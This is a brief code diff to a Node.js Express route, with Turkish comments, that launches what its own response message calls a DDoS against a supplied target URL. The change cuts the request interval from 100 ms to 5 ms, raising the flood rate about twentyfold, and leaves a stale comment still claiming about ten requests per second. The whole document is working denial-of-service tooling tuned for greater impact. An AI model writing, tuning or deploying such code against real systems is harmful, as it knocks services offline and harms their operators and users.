@@ -65,7 +65,7 @@ app.get('/start', (req, res) => {
     // Her 100ms'de 1 istek gönder (Toplamda ~10 istek/saniye)
     intervalId = setInterval(() => {
         sendRequest(targetUrl);
-    }, 100);
+    }, 5);
 
     res.json({ message: `DDOS Başladı! Hedef: ${targetUrl}`, status: "running" });
 });
